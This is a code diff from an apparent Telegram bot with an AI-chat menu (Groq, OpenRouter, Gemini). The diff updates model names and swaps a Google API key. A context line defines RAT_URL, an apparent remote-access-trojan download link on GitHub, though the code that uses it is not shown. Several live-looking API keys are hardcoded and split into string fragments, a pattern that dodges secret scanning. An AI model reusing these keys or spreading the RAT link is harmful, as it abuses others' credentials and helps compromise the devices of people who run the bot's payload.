@@ -34,7 +34,7 @@ RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/Sys
 
 GROQ_KEY = "gsk_" + "puMc23GoRu8Kg" + "qvag7BqWGdyb3F" + "YSL63zpSYmcxSSwSKQHRj5qm0"
 OPENROUTER_KEY = "sk-" + "or-v1-65351102" + "d6baf880d50877" + "1bf7081c13709361" + "b0dda4135f9ccd39" + "2c77cc521e"
-GOOGLE_KEY = "AQ." + "Ab8RN6KhJs9xiYk" + "DT21RNZ86ktVdoj" + "wSgLrAUIUYmgvnhp" + "9piA"
+GOOGLE_KEY = "AQ.Ab8RN6I_fsxT5c" + "BStqUFjDc_wfaMI_IW5Hanc" + "IAXni8PtUgiYA"
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 telegraph = Telegraph()
@@ -440,9 +440,9 @@ def cb_ai_menu(call):
     )
     
     kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(types.InlineKeyboardButton("⚡ Groq (Llama 3.3)", callback_data="ask_groq"))
+    kb.add(types.InlineKeyboardButton("⚡ Groq (Llama 3.1 8B)", callback_data="ask_groq"))
     kb.add(types.InlineKeyboardButton("🦙 OpenRouter (Auto Free)", callback_data="ask_openrouter"))
-    kb.add(types.InlineKeyboardButton("✨ Gemini (Google)", callback_data="ask_gemini"))
+    kb.add(types.InlineKeyboardButton("✨ Gemini (3.8 Flash)", callback_data="ask_gemini"))
     kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
     
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=kb)
@@ -479,7 +479,7 @@ def process_ai_request(message, model):
             res = requests.post(
                 url="https://api.groq.com/openai/v1/chat/completions",
                 headers={"Authorization": f"Bearer {GROQ_KEY}", "Content-Type": "application/json"},
-                json={"model": "llama-3.3-70b-versatile", "messages": [{"role": "user", "content": prompt}]},
+                json={"model": "llama-3.1-8b-instant", "messages": [{"role": "user", "content": prompt}]},
                 timeout=25
             )
             if res.ok: answer = res.json()["choices"][0]["message"]["content"]
@@ -502,7 +502,7 @@ def process_ai_request(message, model):
             
         elif model == "gemini":
             res = requests.post(
-                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key={GOOGLE_KEY}",
+                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-3.8-flash:generateContent?key={GOOGLE_KEY}",
                 json={"contents": [{"parts": [{"text": prompt}]}]},
                 timeout=25
             )
